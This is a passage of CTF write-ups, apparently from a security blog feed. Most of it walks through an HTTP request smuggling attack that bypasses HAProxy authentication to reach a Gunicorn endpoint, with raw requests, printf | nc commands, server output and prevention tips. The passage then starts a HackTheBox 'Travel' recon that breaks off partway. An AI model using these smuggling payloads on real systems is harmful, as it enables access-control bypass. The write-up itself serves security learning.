charset=utf-8</span><br><span class="line">Content-Length: 3642</span><br></pre></td></tr></table></figure><p>As a reminder:</p><blockquote><p>Gunicorn ‘Green Unicorn’ is a Python WSGI HTTP Server for UNIX. It’s a pre-fork worker model. The Gunicorn server is broadly compatible with various web frameworks, simply implemented, light on server resources, and fairly speedy.<a href="https://gunicorn.org/">https://gunicorn.org/</a></p></blockquote><p>Yet we also noticed, when trying to access <code>/results</code> endpoint, a “HAProxy Authentication”.</p><blockquote><p>HAProxy is free, open source software that provides a high availability load balancer and proxy server for TCP and HTTP-based applications that spreads requests across multiple servers.</p><p><a href="http://www.haproxy.org/">http://www.haproxy.org/</a></p></blockquote><p>Alright, with those informations we can get a better understanding on how the back-end of the app looks like. We probably have something like this:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">        User</span><br><span class="line">          | </span><br><span class="line">          |</span><br><span class="line">    +-----+-----+</span><br><span class="line">    |           |</span><br><span class="line">    |  HAProxy  |</span><br><span class="line">    |           |</span><br><span class="line">    +-----+-----+</span><br><span class="line">          | </span><br><span class="line">          |</span><br><span class="line">+---------+----------+     +-------------+</span><br><span class="line">|                    |     |             |</span><br><span class="line">|      Gunicorn      |     |   Web App   |</span><br><span class="line">|  WSGI HTTP Server  +-----+  Python (?) |</span><br><span class="line">|                    |     |             |</span><br><span class="line">+--------------------+     +-------------+       </span><br></pre></td></tr></table></figure><p>At least more or less…</p><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>Alright so now that we have a better understanding of the back-end we can start to see a way this could be exploited.</p><p>The endpoint <code>/results</code> we are trying to read is authentication protected by HAProxy, meaning the application itself probably don’t protect it. </p><p>So if we could find a way to make a direct request to the web server bypassing HAProxy we should be able to access <code>/results</code> without any authentication needed.</p><p>First thing that come to mind is exploiting vulnerability like Server-side request forgery. Unfortunately the app doesn’t allow to exploit such vulnerability… </p><p>Let’s continue to search.</p><p>Another possibility would be request smuggling. </p><p>The idea of Request Smuggling is to leverage the fact that HAProxy and Gunicorn might handle HTTP request differently to craft a request to <code>/results</code> that won’t be interpreted by the front-end server (HAProxy) which will sent it directly to the back-end. In the meantime the back-end server (Gunicorn) will interpret the request correctly, connect to <code>/results</code> endpoint and return the response normally.</p><p>Let’s see in practice how it work.</p><h3 id="HAProxy-request-handling"><a href="#HAProxy-request-handling" class="headerlink" title="HAProxy request handling."></a>HAProxy request handling.</h3><p>Making the following request to front-end HAProxy server:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>6</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"></span><br><span class="line"><span class="sas">0</span></span><br><span class="line"><span class="sas"></span></span><br><span class="line"><span class="sas"><span class="meta">X</span></span></span><br></pre></td></tr></table></figure><p>Will be forwarded to the back-end as such:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Transfer-Encoding</span><span class="punctuation">: </span>chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>172.21.0.1</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>We can see that the last <code>X</code> got dropped and <code>Content-length</code> got ignored. This is the intended behavior according to <a href="https://tools.ietf.org/html/rfc7230#section-3.3.3">RFC 7230 Message Body Length</a>:</p><blockquote><p>If a message is received with both a Transfer-Encoding and a Content-Length header field, the Transfer-Encoding overrides the Content-Length. Such a message might indicate an attempt to perform request smuggling (Section 9.5) or response splitting (Section 9.4) and ought to be handled as an error. A sender MUST remove the received Content-Length field prior to forwarding such a message downstream.</p></blockquote><p>However when sending <code>\x0b</code> (vertical tab) before the “chunked” string HAProxy handle the request differently:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line">Transfer-Encoding:[\x0b]chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>Gets forwarded to the back-end server as:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>13</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>:</span><br><span class="line">                  chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>172.21.0.1</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure><p>HAProxy processed the <code>Content-Length</code> header and determined that the request body is 6 bytes long, up to the end of <code>X</code>. This request is forwarded on to the back-end server.</p><p>However <code>gunicorn</code> will, according to the RFC, proceed <code>Transfer-Encoding</code> header and will handle the message body as using chunked encoding. </p><p>It will proceed the first chunk which is stated to be zero length, and so is treated as terminating the request. Yet the following bytes <code>SMUGGLED</code> are still here, being left unprocessed and the gunicorn back-end server will treat these as being the start of the next request in the sequence.</p><h3 id="Smuggling-request"><a href="#Smuggling-request" class="headerlink" title="Smuggling request"></a>Smuggling request</h3><p>Let’s see if we can confirm that it’s possible to make request smuggling on our Bullshit Bingo using the following request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line">Transfer-Encoding:�chunked</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="number">1</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">A</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">B</span></span></span><br></pre></td></tr></table></figure><p>Because it uses the Content-Length when we have <code>[\x0b]</code> character in the <code>Transfer-Encoding</code> header, HAProxy will forward the following to the <code>gunicorn</code> backend:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>4</span><br><span class="line"><span class="attribute">Transfer-Encoding</span>:</span><br><span class="line">                  chunked</span><br><span class="line"><span class="attribute">X-Forwarded-For</span><span class="punctuation">: </span>172.21.0.1</span><br><span class="line"></span><br><span class="line"><span class="tp"><span class="number">1</span></span></span><br><span class="line"><span class="tp"><span class="keyword">Z</span></span></span><br></pre></td></tr></table></figure><p>If the <code>gunicorn</code> parses this request using <code>Transfer-Encoding</code>, then it will timeout waiting for <code>0\r\n\r\n</code> chunk that would usually terminate the request. Let’s give a try:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ printf &quot;POST / HTTP/1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 4\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nZ\r\nQ&quot; | nc misc.ctf:33433</span><br><span class="line"></span><br><span class="line">HTTP/1.1 400 BAD REQUEST</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:21:42 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;</span><br><span class="line">HTTP/1.0 408 Request Time-out</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html</span><br><span class="line"></span><br><span class="line">&lt;html&gt;&lt;body&gt;&lt;h1&gt;408 Request Time-out&lt;/h1&gt;</span><br><span class="line">Your browser didn&#x27;t send a complete request in time.</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>Bingo, we got a <code>408 Request Time-out</code>. Also did you notice ? We got two response to, seemingly, one HTTP request. This confirm we can smuggle request.</p><p>But what now ? What can we do with that ?</p><p>First let’s try to see if it’s possible to smuggle a second HTTP request in the main one. </p><p>Let’s try for example to access a 404 page and see if the response match:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding:�chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">A</span></span></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">foo</span>: xGET / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure><p>Before trying, let’s details what <em>should</em> happen in this request?</p><p>Because of the <code>Content-Lengh</code> of 38, the HAProxy will transfer 2 different requests to the backend:</p><p><em>1st request:</em></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding:�chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">A</span></span></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">GET</span> /<span class="number">404</span> HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">foo</span>: x</span></span><br></pre></td></tr></table></figure><p><em>2nd request:</em></p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>Yet when <code>gunicorn</code> will receive the first request it will proceed the <code>Transfer-Encoding</code> header, processing the first part:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding:�chunked</span><br><span class="line"></span><br><span class="line"><span class="css"><span class="number">1</span></span></span><br><span class="line"><span class="css"><span class="selector-tag">A</span></span></span><br><span class="line"><span class="css"><span class="number">0</span></span></span><br></pre></td></tr></table></figure><p>Until it arrives to the chunk which is stated to be zero length, and so treated as terminating the request. But! The following bytes are still there being left unprocessed:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">foo</span><span class="punctuation">: </span>x</span><br></pre></td></tr></table></figure><p>So when <code>gunicorn</code> received the 2nd request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure><p>It will actually just get appended to the bytes which remained unprocessed before, resulting in the following request:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/404</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">foo</span><span class="punctuation">: </span>xGET / HTTP/1.1</span><br></pre></td></tr></table></figure><p>Which <code>gunicorn</code> will simply proceed as a valid request.</p><p>Alright, let’s see in practice if we can make it work!</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">printf</span> <span class="string">&quot;POST / HTTP/1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 38\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /404 HTTP/1.1\r\nfoo: xGET / HTTP/1.1\r\n\r\n&quot;</span> | nc misc.ctf:33433</span><br><span class="line"></span><br><span class="line">HTTP/1.1 400 BAD REQUEST</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:38:16 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;</span><br><span class="line">HTTP/1.1 404 NOT FOUND</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:38:16 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 232</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;404 Not Found&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Not Found&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>Perfect! It worked.</p><p>What’s the next step ? Smuggling a request to <code>/results</code> endpoint. Since <code>HAProxy</code> won’t see the request it won’t prompt authentication. Yet <code>gunicorn</code> will proceed our request without issues.</p><p>We can do something like so:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>misc.ctf:33433</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>39</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding:�chunked</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">A</span></span></span><br><span class="line"><span class="apache"><span class="attribute">0</span></span></span><br><span class="line"><span class="apache"></span></span><br><span class="line"><span class="apache"><span class="attribute">GET</span> /results HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br><span class="line"><span class="apache"><span class="attribute">Foo</span>: xGET / HTTP/<span class="number">1</span>.<span class="number">1</span></span></span><br></pre></td></tr></table></figure><p>Let’s give it a try:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">printf</span> <span class="string">&quot;POST / HTTP/1.1\r\nHost: misc.ctf:33433\r\nContent-Length: 39\r\nContent-Type: application/x-www-form-urlencoded\r\nTransfer-Encoding:^Lchunked\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /results HTTP/1.1\r\nFoo: xGET / HTTP/1.1\r\n\r\n&quot;</span> | nc misc.ctf:33433</span><br><span class="line"></span><br><span class="line">HTTP/1.1 400 BAD REQUEST</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:41:32 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 192</span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE HTML PUBLIC <span class="string">&quot;-//W3C//DTD HTML 3.2 Final//EN&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;400 Bad Request&lt;/title&gt;</span><br><span class="line">&lt;h1&gt;Bad Request&lt;/h1&gt;</span><br><span class="line">&lt;p&gt;The browser (or proxy) sent a request that this server could not understand.&lt;/p&gt;</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: gunicorn/19.9.0</span><br><span class="line">Date: Thu, 04 Jun 2020 17:41:32 GMT</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Content-Length: 30</span><br><span class="line"></span><br><span class="line">flag&#123;r3KW35t 5mu99L1N9 12 8Ad&#125;</span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><ul><li><a href="https://portswigger.net/web-security/request-smuggling">HTTP request smuggling | Port Swigger Web Security</a></li><li><a href="https://portswigger.net/web-security/request-smuggling/finding">Finding HTTP request smuggling vulnerabilities | Port Swigger Web Security</a></li><li><a href="https://portswigger.net/web-security/request-smuggling/exploiting">Exploiting HTTP request smuggling vulnerabilities | Port Swigger Web Security</a></li><li><a href="https://blog.zeddyu.info/2019/12/08/HTTP-Smuggling-en">Understanding HTTP Smuggling in one article | zeddyu.info</a></li><li><a href="https://paper.seebug.org/1049/">Protocol Layer Attack - HTTP Request Smuggling | Knownsec 404 Team</a></li><li><a href="https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/">HTTP Smuggling, Apache Traffic Server | Regilero’s blog</a></li><li><a href="https://nathandavison.com/blog/haproxy-http-request-smuggling">HAProxy HTTP request smuggling | nathandavison.com</a></li><li><a href="https://github.com/benoitc/gunicorn/issues/2176">Fix Transfer-Encoding Handling | Gunicorn Issue</a></li></ul><h3 id="Prevention-Methods"><a href="#Prevention-Methods" class="headerlink" title="Prevention Methods"></a>Prevention Methods</h3><ul><li>Disable reuse of back-end connections, so that each back-end request is sent over a separate network connection.</li><li>Use HTTP/2 for back-end connections, as this protocol prevents ambiguity about the boundaries between requests.</li><li>Use exactly the same web server software for the front-end and back-end servers, so that they agree about the boundaries between requests.</li></ul><h3 id="Real-Life-Example"><a href="#Real-Life-Example" class="headerlink" title="Real Life Example"></a>Real Life Example</h3><ul><li><a href="https://hackerone.com/reports/726773">Request smuggling on admin-official.line.me could lead to account takeover ($9,000) | HackerOne</a></li><li><a href="https://hackerone.com/reports/737140">Mass account takeovers using HTTP Request Smuggling on https://slackb.com/ to steal session cookies ($6,500) | HackerOne</a></li><li><a href="https://hackerone.com/reports/498052">Password theft login.newrelic.com via Request Smuggling ($3,000) | HackerOne</a></li><li><a href="https://hackerone.com/reports/726773">HTTP Request Smuggling on https://labs.data.gov | HackerOne</a></li><li><a href="https://hackerone.com/reports/771666">Account takeover vulnerability using HTTP Request Smuggling and Desync attacks ($5,000) | HackerOne</a></li></ul><hr><p>That’s it folks! As always do not hesitate to contact me for any questions or feedbacks!</p><p>See you next time ;)</p><p>-hg8</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> beginner </tag>
            
            <tag> request smuggling </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackTheBox - Travel</title>
      <link href="/posts/travels/"/>
      <url>/posts/travels/</url>
      
        <content type="html"><![CDATA[<img width="580" alt="travel-hackthebox" src="https://user-images.githubusercontent.com/9076747/83274122-9a75cb00-a1cd-11ea-8e44-a3d1de73447c.png"><p>Travel just retired on HackTheBox. It’s a hard difficulty Linux box. The box was really well designed but it’s the one that gives me the biggest headache so far. The path to user is really not obvious and require a lot of enumeration and stepping back, looking at the big picture to understand what’s going on behind the hood and how it can be exploited. This box doesn’t rely on common vulnerabilities but rather on little configuration and coding mistakes that allows you to chain vulnerability until you can obtain what you need. In the end it’s a though but awesome box that I really recommend. </p><p><strong>Tl;Dr:</strong> To get the user flag you first have to retrieve some php files code source from an open <code>git</code> repository. With information found in the source code you discover an SSRF vulnerability and an object deserialization vulnerability through <code>memcached</code>. Linking those two vulnerabilities we achieve arbitrary file write allowing us to create a web-shell. The web server runs in a Docker container and we have to explore to find a SQL backup file containing hashed password for <code>lynik-admin</code> user. Cracking the hash allow to use password to connect through SSH and get the user flag.<br>For the root flag you have to find the LDAP admin password in <code>.viminfo</code> cache file. Using this admin password it’s possible, using LDAP, to edit the permission of one user on the box to give him <code>root</code> access trough sudo. It’s also possible to edit its SSH key and account password, giving us full access to a privileged account and use it to get the root flag.</p><p>Alright! Let’s get into the details now!</p><hr><p>First thing first, let’s add the box IP to the hosts file:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.10.10.189 traval.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>and let’s start!</p><h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan to see which ports are open on the box:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$  nmap -sV -sT -sC travel.htb</span><br><span class="line">Nmap scan report <span class="keyword">for</span> travel.htb (10.10.10.189)</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http     nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB</span><br><span class="line">443/tcp open  ssl/http nginx 1.17.6</span><br><span class="line">|_http-title: Travel.HTB - SSL coming soon.</span><br><span class="line">| ssl-cert: Subject: commonName=www.travel.htb/organizationName=Travel.HTB/countryName=UK</span><br><span class="line">|_ Subject Alternative Name: DNS:www.travel.htb, DNS:blog.travel.htb, DNS:blog-dev.travel.htb</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 17.06 seconds</span><br></pre></td></tr></table></figure><p>We have a classical web app running on port 80, 443 and the SSH port 22 open.</p><p><code>nmap</code> gives us additional information about two subdomains: <code>blog.travel.htb</code> and <code>blog-dev.travel.htb</code>.</p><p>Opening <a href="http://travel.htb/">http://travel.htb</a> display a following page:</p><img width="1012" alt="travel homepage" src="https://user-images.githubusercontent.com/9076747/83331082-1f2b1c80-a294-11ea-89cc-beecf347e724.png"><p>Not much we can’t do from here… Let’s move on.</p><p>Opening <a href="https://travel.htb/">https://travel.htb</a> display a following page:</p><img width="1012" alt="travel https homepage" src="https://user-images.githubusercontent.com/9076747/83331099-44b82600-a294-11ea-8106-7376cb873716.png"><p>The port 443 seems quite empty aswell… Let’s take a look at the subdomains:</p><p>Opening <a href="http://blog-dev.travel.htb/">http://blog-dev.travel.htb</a> returns a <code>403 Forbidden</code> while <a href="http://blog.travel.htb/">http://blog.travel.htb</a> returns an actual blog:</p><img width="1012" alt="travel blog homepage" src="https://user-images.githubusercontent.com/9076747/83331292-87c6c900-a295-11ea-931f-0aea5b5461a1.png"><p>The blog is a Wordpress (<code>Powered by WordPress </code> in the footer) and it main and only feature seems to be the “Awesome RSS” reader:</p><blockquote><p>Welcome to our Travel Blog. Make sure to check out our new RSS feature coming fresh from our blog-dev team!</p></blockquote><p>The page display an RSS Reader with apparently nothing in particular:</p><img width="1012" alt="travel 